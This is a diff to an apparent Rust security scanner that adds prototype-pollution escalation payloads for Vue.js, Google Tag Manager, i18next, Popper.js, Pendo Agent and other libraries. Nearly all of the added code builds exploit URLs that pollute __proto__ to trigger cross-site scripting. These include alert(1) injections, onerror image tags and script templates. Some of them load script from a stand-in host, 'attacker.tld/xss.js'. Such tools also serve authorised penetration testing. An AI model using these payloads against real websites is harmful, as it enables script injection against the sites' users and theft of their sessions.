@@ -551,6 +551,289 @@ fn escalate(target: String, gadgets: Vec<String>) {
 					.unwrap(), gadget
 				)
 			},
+			"Vue.js" => {
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[v-if]",
+								"_c.constructor('alert(1)')()"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[attrs][0][name]",
+								"src"
+							),
+							(
+								"__proto__[attrs][0][value]",
+								"xxx"
+							),
+							(
+								"__proto__[xxx]",
+								"data:,alert(1)//"
+							),
+							(
+								"__proto__[is]",
+								"script"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[v-bind:class]",
+								"''.constructor.constructor('alert(1)')()"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[data]",
+								"a"
+							),
+							(
+								"__proto__[template][nodeType]",
+								"a"
+							),
+							(
+								"__proto__[template][innerHTML]",
+								"<script>alert(1)</script>"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[props][][value]",
+								"a"
+							),
+							(
+								"__proto__[name]",
+								"\":''.constructor.constructor('alert(1)')(),\""
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[template]",
+								"<script>alert(1)</script>"
+							)
+						]
+					)
+					.unwrap(), gadget
+				)
+			},
+			"Demandbase Tag" => {
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[Config][SiteOptimization][enabled]",
+								"1"
+							),
+							(
+								"//attacker.tld/json_cors.php?",
+								"1"
+							)
+						]
+					)
+					.unwrap(), gadget
+				)
+			},
+			"Google Tag Manager/Analytics" => {
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[customScriptSrc]",
+								"//attacker.tld/xss.js"
+							)
+						]
+					)
+					.unwrap(), gadget
+				)
+			},
+			"i18next" => {
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[lng]",
+								"cimode"
+							),
+							(
+								"__proto__[appendNamespaceToCIMode]",
+								"x"
+							),
+							(
+								"__proto__[nsSeparator]",
+								"<img/src/onerror=alert(1)>"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[lng]",
+								"a"
+							),
+							(
+								"__proto__[a]",
+								"b"
+							),
+							(
+								"__proto__[obj]",
+								"c"
+							),
+							(
+								"__proto__[k]",
+								"d"
+							),
+							(
+								"__proto__[d]",
+								"<img/src/onerror=alert(1)>"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[lng]",
+								"a"
+							),
+							(
+								"__proto__[key]",
+								"<img/src/onerror=alert(1)>"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+			},
+			"Google Analytics" => {
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[cookieName]",
+								"COOKIE=Injection;"
+							)
+						]
+					)
+					.unwrap(), gadget
+				)
+			},
+			"Popper.js" => {
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[arrow][style]",
+								"color:red;transition:all 1s"
+							),
+							(
+								"__proto__[arrow][ontransitionend]",
+								"alert(1)"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[reference][style]",
+								"color:red;transition:all 1s"
+							),
+							(
+								"__proto__[reference][ontransitionend]",
+								"alert(2)"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[popper][style]",
+								"color:red;transition:all 1s"
+							),
+							(
+								"__proto__[popper][ontransitionend]",
+								"alert(2)"
+							)
+						]
+					)
+					.unwrap(), gadget
+				);
+			},
+			"Pendo Agent" => {
+				show_pontential(
+					Url::parse_with_params(
+						&target,
+						&[
+							(
+								"__proto__[dataHost]",
+								"attacker.tld/js.js#"
+							)
+						]
+					)
+					.unwrap(), gadget
+				)
+			},
 			_ => ()
 		}
 	}
